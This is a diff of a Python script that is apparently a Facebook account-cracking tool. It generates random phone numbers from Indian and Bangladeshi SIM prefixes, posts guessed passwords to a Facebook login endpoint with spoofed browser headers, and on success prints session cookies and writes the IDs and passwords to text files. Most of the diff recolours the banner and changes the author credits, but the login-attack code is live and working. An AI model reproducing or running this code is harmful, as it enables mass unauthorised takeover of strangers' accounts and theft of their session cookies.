@@ -89,17 +89,18 @@ xxx=('\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37
 
 
 
-logo= """\033[1;91md8888b.  .d8b.     d88b d88888b .d8888. db   db 
-\033[1;92m88  `8D d8' `8b    `8P' 88'     88'  YP 88   88 
-\033[1;93m88oobY' 88ooo88     88  88ooooo `8bo.   88ooo88 
-\033[1;94m88`8b   88~~~88     88  88~~~~~   `Y8b. 88~~~88 
-\033[1;95m88 `88. 88   88 db. 88  88.     db   8D 88   88 
-\033[1;96m88   YD YP   YP Y8888P  Y88888P `8888Y' YP   YP 
-\033[1;97m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─
-\033[1;92m[-] ADMIN    : ATTITUDE KING RAJESH 
-\033[1;96m[-] FACEBOOK  :ATTITUDE KING RAJESH
-\033[1;91m[-] GITHUB    :ATTITUDE KING RAJESH
-\033[1;94m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─"""
+logo= """\033[1;37md8888b.  .d8b.     d88b d88888b .d8888. db   db 
+\033[1;32m88  `8D d8' `8b    `8P' 88'     88'  YP 88   88 
+\033[1;37m88oobY' 88ooo88     88  88ooooo `8bo.   88ooo88 
+\033[1;32m88`8b   88~~~88     88  88~~~~~   `Y8b. 88~~~88 
+\033[1;37m88 `88. 88   88 db. 88  88.     db   8D 88   88 
+\033[1;32m88   YD YP   YP Y8888P  Y88888P `8888Y' YP   YP 
+\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─
+\033[1;32m[-] ADMIN    : RAJESH Vaijan
+\033[1;32m[-] FACEBOOK  :RAJESH
+\033[1;32m[-] GITHUB    :Rajesh108765
+\033[1;32m[-] VERSION   :\033[1;93m 0.2
+\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─\033[1;32m━\033[1;37m─"""
 
 
 
@@ -112,8 +113,8 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-        print('\033[1;32m[\033[1;32m1\033[1;32m] START RANDOM CLONE')
-        print('\033[1;32m[\033[1;32m0\033[1;32m] EXIT')
+        print('\033[1;32m[\033[1;32m1\033[1;37m] START RANDOM CLONE')
+        print('\033[1;32m[\033[1;32m0\033[1;31m] EXIT')
         print(xxx)
         Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
         if Shorif in ["1", "01"]:
@@ -139,17 +140,16 @@ def v2():
     os.system('clear')
     print(logo)
     print(xxx)
-    print('\033[1;93m[+] EXAMPLE DOAMIN =>017,018,019,016,015 ')
+    print('\033[1;37m[+] EXAMPLE DOAMIN IND=>74,98,,99,87,79,84')
+    print('\033[1;33m[+] EXAMPLE DOAMIN BD=>017,018,019,016,015')
     print(xxx)
-    print('\033[1;92m[+] EXAMPLE DOAMIN =>98,78,86,80,99,89 ')
-    print(xxx)
-    kode = input('\033[1;31m[\033[1;32m?\033[1;32m] SIM CODE : ')
+    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
     print(xxx)
-    print('\033[1;93m[+] SIM CODE-2000-5000-10000-15000-50000')
+    print('\033[1;32m[+] SIM CODE-2000-5000-10000-15000-50000')
     print(xxx)
     limit = int(input('\033[1;32m[?] How many numbers do you want to add : '))
     for nmbr in range(limit):
@@ -193,40 +193,38 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'referer': 'https://mbasic.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
-}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority':"x.facebook.com",
+            'method':'GET',
+            'path':'/?tbua=1',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"', 
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Android"',
+            "sec-fetch-dest": "document",
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            "sec-fetch-user": "?1",
+            'user-agent': pro,}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\r\r\x1b[38;5;46m[RAJESH-OK] '+uid+' | '+ps+'\033[1;97m')
-                print (f"\033[1;91m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
-                open('RAJESH -OK.txt', 'a').write(cid+' | '+ps+'\n')
+                print('\r\r\x1b[38;5;46m[RAJESH💛OK] '+uid+' | '+ps+'\033[1;97m')
+                print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m COOKIES❤️: {coki} ")
+                open('RAJESH -Ok.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid);cek_apk(coki)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
-                open('RAJESH-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print('\33[1;93m[CHECKPOINT💔] '+uid+' | '+ps+'\33[0;97m')
+                open('RAJESH-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
